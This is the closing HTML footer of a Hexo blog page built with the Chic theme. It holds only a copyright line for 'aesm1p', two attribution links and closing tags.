        <span>Â© aesm1p | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>